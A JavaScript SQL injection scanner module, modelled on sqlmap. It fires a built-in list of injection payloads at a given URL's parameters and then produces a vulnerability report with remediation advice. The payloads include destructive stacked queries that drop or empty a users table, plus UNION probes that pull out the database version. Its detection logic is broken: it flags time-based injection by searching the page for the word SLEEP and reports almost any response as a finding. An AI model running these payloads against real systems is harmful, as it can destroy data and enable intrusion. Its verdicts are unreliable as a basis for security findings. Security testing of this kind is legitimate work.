/**
 * SQL Injection Detection Tool - sqlmap-like functionality
 * Tests for SQL injection vulnerabilities
 */

// SQL Injection payloads
const SQL_PAYLOADS = [
  // Basic injection
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1/*",
  "admin' --",
  "' or 1=1 #",
  
  // UNION based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT database(),user()--",
  
  // Time-based blind
  "' AND SLEEP(5)--",
  "'; WAITFOR DELAY '00:00:05'--",
  "' AND if(1=1,SLEEP(5),0)--",
  
  // Boolean-based blind
  "' AND '1'='1",
  "' AND '1'='2",
  "' AND SUBSTRING(database(),1,1)='m'--",
  
  // Error-based
  "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
  "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
  
  // Stacked queries
  "'; DROP TABLE users;--",
  "'; DELETE FROM users;--",
  
  // Encoding attempts
  "%27 OR %271%27=%271",
  "' OR char(49)=char(49)",
  "' OR '+1'='+1",
];

// SQL keywords to check for
const SQL_KEYWORDS = [
  'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
  'UNION', 'WHERE', 'FROM', 'JOIN', 'ORDER BY',
  'GROUP BY', 'HAVING', 'LIKE', 'BETWEEN', 'IN',
  'EXECUTE', 'EXEC', 'SCRIPT', 'JAVASCRIPT', 'ALERT'
];

export async function sqlScan(url, parameters = []) {
  const results = {
    url: url,
    timestamp: new Date().toISOString(),
    vulnerabilities: [],
    parameterAnalysis: {},
    summary: {}
  };

  console.log(`💉 Starting SQL injection scan on ${url}...`);

  // Analyze each parameter
  for (const param of parameters) {
    results.parameterAnalysis[param] = {
      parameter: param,
      vulnerable: false,
      payloadsTriggered: [],
      riskLevel: 'SAFE'
    };

    // Test each payload
    for (const payload of SQL_PAYLOADS) {
      try {
        const testUrl = `${url}?${param}=${encodeURIComponent(payload)}`;
        const response = await testUrlForSQLi(testUrl);

        if (response.vulnerable) {
          results.vulnerabilities.push({
            parameter: param,
            payload: payload,
            type: identifySQLiType(payload),
            severity: response.severity || 'HIGH',
            indicator: response.indicator,
            recommendation: getSQLiRecommendation()
          });

          results.parameterAnalysis[param].vulnerable = true;
          results.parameterAnalysis[param].payloadsTriggered.push(payload);
          results.parameterAnalysis[param].riskLevel = 'CRITICAL';
        }
      } catch (error) {
        // Continue scanning
      }
    }
  }

  // Generate summary
  results.summary = {
    parametersScanned: parameters.length,
    vulnerabilitiesFound: results.vulnerabilities.length,
    riskLevel: results.vulnerabilities.length > 0 ? 'CRITICAL' : 'SAFE',
    payloadsUsed: SQL_PAYLOADS.length,
    criticalParameters: Object.values(results.parameterAnalysis).filter(p => p.vulnerable).length
  };

  return results;
}

async function testUrlForSQLi(testUrl) {
  return new Promise((resolve) => {
    try {
      fetch(testUrl, { timeout: 8000 })
        .then(res => res.text())
        .then(html => {
          const result = detectSQLiInResponse(html);
          resolve(result);
        })
        .catch(() => resolve({ vulnerable: false }));
    } catch (error) {
      resolve({ vulnerable: false });
    }
  });
}

function detectSQLiInResponse(html) {
  // SQL error patterns
  const errorPatterns = [
    /SQL syntax|mysql_fetch|mysql_num_rows|mysql_error|ORA-|SQLServer|postgresql/i,
    /Warning: mysql_|Warning: mysqli|Warning: SQLite|Fatal error.*SQL/i,
    /syntax error|unexpected end of SQL|SQL command not properly ended/i,
    /Server Error 500|Internal Server Error|Database Error/i,
    /Column|Table|Database does not exist|Unknown database/i
  ];

  for (const pattern of errorPatterns) {
    if (pattern.test(html)) {
      return {
        vulnerable: true,
        severity: 'CRITICAL',
        indicator: 'SQL Error Message Detected'
      };
    }
  }

  // Check for timing delays (time-based blind)
  if (html.includes('SLEEP') || html.includes('WAITFOR')) {
    return {
      vulnerable: true,
      severity: 'HIGH',
      indicator: 'Time-based SQL Injection Possible'
    };
  }

  // Check response length variations (boolean-based blind)
  // This would require multiple requests with true/false conditions
  
  return { vulnerable: false };
}

function identifySQLiType(payload) {
  if (payload.includes('UNION')) return 'UNION_BASED';
  if (payload.includes('SLEEP') || payload.includes('WAITFOR') || payload.includes('DELAY')) return 'TIME_BASED_BLIND';
  if (payload.includes("'='") || payload.includes('AND') && payload.includes('=')) return 'BOOLEAN_BASED_BLIND';
  if (payload.includes('extractvalue') || payload.includes('updatexml')) return 'ERROR_BASED';
  if (payload.includes('DROP') || payload.includes('DELETE')) return 'STACKED_QUERIES';
  return 'UNION_BASED';
}

function getSQLiRecommendation() {
  return `
    1. Use Prepared Statements / Parameterized Queries
    2. Input Validation with Whitelist Approach
    3. Escape Special Characters Properly
    4. Least Privilege Database Users
    5. Error Message Suppression in Production
    6. Web Application Firewall (WAF)
    7. Regular Security Testing & Code Review
    8. Use ORM Frameworks (Sequelize, TypeORM, SQLAlchemy)
  `;
}

// Advanced SQL injection detection
export function analyzeParameterForSQLi(parameterName, sampleValue) {
  const risks = [];

  // Check if parameter is used in database queries (static analysis)
  if (parameterName.toLowerCase().includes('id') || 
      parameterName.toLowerCase().includes('search') ||
      parameterName.toLowerCase().includes('query') ||
      parameterName.toLowerCase().includes('filter')) {
    risks.push({
      parameter: parameterName,
      riskLevel: 'HIGH',
      reason: 'Common SQL injection parameter name',
      recommendation: 'Implement strict input validation and parameterized queries'
    });
  }

  // Check sample value
  if (sampleValue && (
    sampleValue.includes(',') ||
    sampleValue.includes("'") ||
    sampleValue.includes('"') ||
    sampleValue.includes(';') ||
    sampleValue.includes('*')
  )) {
    risks.push({
      parameter: parameterName,
      riskLevel: 'MEDIUM',
      reason: 'Value contains special characters',
      recommendation: 'Sanitize and validate input'
    });
  }

  return risks;
}

// Detect common database systems
export function detectDatabaseSystem(errorMessages) {
  const systems = [];

  if (/MySQL|mysql/i.test(errorMessages)) systems.push('MySQL');
  if (/PostgreSQL|postgres|pgsql/i.test(errorMessages)) systems.push('PostgreSQL');
  if (/Oracle|ORA-/i.test(errorMessages)) systems.push('Oracle Database');
  if (/SQL Server|MSSQL|SqlServer/i.test(errorMessages)) systems.push('Microsoft SQL Server');
  if (/SQLite/i.test(errorMessages)) systems.push('SQLite');
  if (/MongoDB|mongo/i.test(errorMessages)) systems.push('MongoDB');

  return systems;
}

// Test for database enumeration techniques
export async function testDatabaseEnumeration(url, baseParameter) {
  const enumTests = [];

  // Test for version extraction
  const versionPayloads = [
    "' UNION SELECT NULL,version()--",
    "' UNION SELECT NULL,@@version--",
    "' UNION SELECT NULL,sqlite_version()--"
  ];

  for (const payload of versionPayloads) {
    try {
      const testUrl = `${url}?${baseParameter}=${encodeURIComponent(payload)}`;
      const response = await fetch(testUrl, { timeout: 5000 });
      const html = await response.text();

      if (html.length > 0 && !html.includes('404')) {
        enumTests.push({
          type: 'VERSION_DISCOVERY',
          severity: 'HIGH',
          recommendation: 'Database version information exposed'
        });
      }
    } catch (error) {
      // Continue
    }
  }

  return enumTests;
}

export function generateSQLReport(results) {
  let report = `
SQL INJECTION VULNERABILITY REPORT
===================================
URL: ${results.url}
Scan Date: ${results.timestamp}

SUMMARY:
--------
Parameters Scanned: ${results.summary.parametersScanned}
Vulnerabilities Found: ${results.summary.vulnerabilitiesFound}
Critical Parameters: ${results.summary.criticalParameters}
Risk Level: ${results.summary.riskLevel}
Payloads Used: ${results.summary.payloadsUsed}

VULNERABLE PARAMETERS:
----------------------
`;

  if (results.vulnerabilities.length === 0) {
    report += 'No SQL injection vulnerabilities detected.\n';
  } else {
    results.vulnerabilities.forEach((vuln, index) => {
      report += `
${index + 1}. ${vuln.type} (${vuln.severity})
   Parameter: ${vuln.parameter}
   Indicator: ${vuln.indicator}
   Payload: ${vuln.payload.substring(0, 50)}...
   Recommendations: ${vuln.recommendation}
`;
    });
  }

  report += `
REMEDIATION:
------------
1. Update database connection frameworks to latest version
2. Code review of database query construction
3. Implement input validation rules
4. Deploy Web Application Firewall (WAF)
5. Regular security testing and penetration testing
6. Security awareness training for developers
`;

  return report;
}

// Vulnerability scoring for SQL injection
export function calculateSQLiRiskScore(vulnerabilities) {
  let score = 0;

  vulnerabilities.forEach(vuln => {
    if (vuln.severity === 'CRITICAL') score += 40;
    else if (vuln.severity === 'HIGH') score += 25;
    else if (vuln.severity === 'MEDIUM') score += 15;
  });

  return Math.min(100, score);
}
